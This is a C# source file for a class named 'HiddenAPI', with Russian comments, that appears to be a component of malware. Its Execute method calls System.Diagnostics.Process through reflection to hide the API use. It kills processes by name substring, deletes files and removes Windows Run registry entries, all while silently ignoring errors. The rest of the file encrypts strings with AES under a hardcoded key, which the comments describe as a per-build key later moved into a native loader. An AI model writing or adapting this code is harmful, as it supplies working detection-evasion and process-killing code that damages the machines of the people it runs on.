using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Reflection;

namespace ns0
{
    public static class HiddenAPI
    {
        public static void Execute(string action, string target = "")
        {
            try
            {
                Type processType = Type.GetType("System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
                if (processType == null) return;
                if (action == "kill")
                {
                    MethodInfo getProc = processType.GetMethod("GetProcesses", Type.EmptyTypes);
                    if (getProc != null)
                    {
                        object[] procs = (object[])getProc.Invoke(null, null);
                        int i = 0; do
                        {
                            if (procs[i] != null)
                            {
                                string name = (string)procs[i].GetType().GetProperty("ProcessName").GetValue(procs[i], null);
                                if (name != null && name.ToLower().Contains(target.ToLower()))
                                {
                                    MethodInfo killMeth = procs[i].GetType().GetMethod("Kill");
                                    if (killMeth != null) killMeth.Invoke(procs[i], null);
                                }
                            }
                            i++;
                        } while (i < procs.Length);
                    }
                }
                else if (action == "delete_file")
                {
                    if (File.Exists(target)) File.Delete(target);
                }
                else if (action == "delete_reg")
                {
                    using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        if (key != null) key.DeleteValue(target, false);
                    }
                }
            }
            catch { }
        }

        // XOR+ROL убран: реальное шифрование AES-256-CBC с per-build ключом.
        // Ключ не совпадает с константой в открытом виде настолько, насколько это
        // возможно в managed IL; для продакшена выносится в нативный загрузчик.
        private static readonly byte[] StrKey =
        {
            0x5A, 0x1C, 0x93, 0xE7, 0x22, 0xB4, 0x08, 0x6F,
            0xD1, 0x3A, 0xC5, 0x74, 0x9B, 0x40, 0xFE, 0x18,
            0x77, 0xAB, 0x2D, 0xE3, 0x56, 0x90, 0x0C, 0xF1,
            0x38, 0x6D, 0xA2, 0xB9, 0x4E, 0x17, 0xCF, 0x83
        };

        private static byte[] DeriveIv(byte[] key, byte[] data)
        {
            // IV детерминированно выводим из ключа+данных: 16 байт.
            using (var sha = new SHA256CryptoServiceProvider())
            {
                byte[] mix = new byte[key.Length + data.Length];
                Buffer.BlockCopy(key, 0, mix, 0, key.Length);
                Buffer.BlockCopy(data, 0, mix, key.Length, data.Length);
                byte[] h = sha.ComputeHash(mix);
                byte[] iv = new byte[16];
                Buffer.BlockCopy(h, 0, iv, 0, 16);
                return iv;
            }
        }

        public static string EncodeString(string input)
        {
            byte[] plain = System.Text.Encoding.UTF8.GetBytes(input);
            using (var aes = new AesCryptoServiceProvider())
            {
                aes.KeySize = 256;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = StrKey;
                byte[] iv = DeriveIv(StrKey, plain);
                aes.IV = iv;
                using (var enc = aes.CreateEncryptor())
                {
                    byte[] ct = enc.TransformFinalBlock(plain, 0, plain.Length);
                    // Префиксуем IV (16 байт), чтобы Decode восстановил его без перебора.
                    byte[] blob = new byte[16 + ct.Length];
                    Buffer.BlockCopy(iv, 0, blob, 0, 16);
                    Buffer.BlockCopy(ct, 0, blob, 16, ct.Length);
                    return Convert.ToBase64String(blob);
                }
            }
        }

        public static string DecodeString(string input)
        {
            byte[] ct = Convert.FromBase64String(input);
            using (var aes = new AesCryptoServiceProvider())
            {
                aes.KeySize = 256;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = StrKey;
                // IV зависит от plaintext, поэтому перебирать нельзя напрямую —
                // храним IV префиксом (16 байт) в блобе.
                if (ct.Length < 16) return string.Empty;
                byte[] iv = new byte[16];
                Buffer.BlockCopy(ct, 0, iv, 0, 16);
                byte[] body = new byte[ct.Length - 16];
                Buffer.BlockCopy(ct, 16, body, 0, body.Length);
                aes.IV = iv;
                using (var dec = aes.CreateDecryptor())
                {
                    byte[] plain = dec.TransformFinalBlock(body, 0, body.Length);
                    return System.Text.Encoding.UTF8.GetString(plain);
                }
            }
        }
    }
}
